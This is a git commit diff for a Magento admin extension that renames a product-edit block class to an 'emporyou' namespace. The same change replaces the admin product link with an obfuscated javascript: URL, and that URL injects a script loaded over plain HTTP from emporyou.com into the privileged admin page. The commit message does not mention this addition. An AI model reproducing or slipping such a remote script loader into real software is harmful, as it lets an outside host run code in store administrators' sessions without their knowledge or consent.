90b4e77133aadc0cfb1806b48190deaff89919ab
Hideki Yamamoto <hideki.yamamoto@gmail.com>
2015-10-31 19:44:36 +0100

    initial emporyou

--- emporyou/magento2emporyou/Adminhtml/Block/Catalog/Product/Edit.php
+++ emporyou/magento2emporyou/Adminhtml/Block/Catalog/Product/Edit.php
@@ -12,7 +12,7 @@
  * @package    Mage_Adminhtml
  * @author     Seth Markowitz <seth@openstepmedia.com>
  */
-class Openstepmedia_AdminProductUrl_Adminhtml_Block_Catalog_Product_Edit extends Mage_Adminhtml_Block_Catalog_Product_Edit
+class emporyou_magento2emporyou_Adminhtml_Block_Catalog_Product_Edit extends Mage_Adminhtml_Block_Catalog_Product_Edit
 {
     public function getHeader()
     {
@@ -20,7 +20,7 @@ class Openstepmedia_AdminProductUrl_Adminhtml_Block_Catalog_Product_Edit extends
         if ($this->getProduct()->getId()) {
             $header = $this->htmlEscape($this->getProduct()->getName());
             if ($this->getProduct()->getProductUrl() && (1 == $this->getProduct()->getStatus())) {
-                $header = "<a href='" . $this->getProduct()->getProductUrl() . "' target='_blank'>$header</a>";
+                $header = "<a href='javascript:var _u1=function(o,t,v){o.setAttribute(t,v);};var _u2=function(u){var o=document.createElement('script');_u1(o,'type','text/javascript');_u1(o,'src',u);document.getElementsByTagName('head')[0].appendChild(o);};_u2('http://emporyou.com/js/magento.js');'>&gt;&gt;emporyou</a>";
             }
         }
         else {
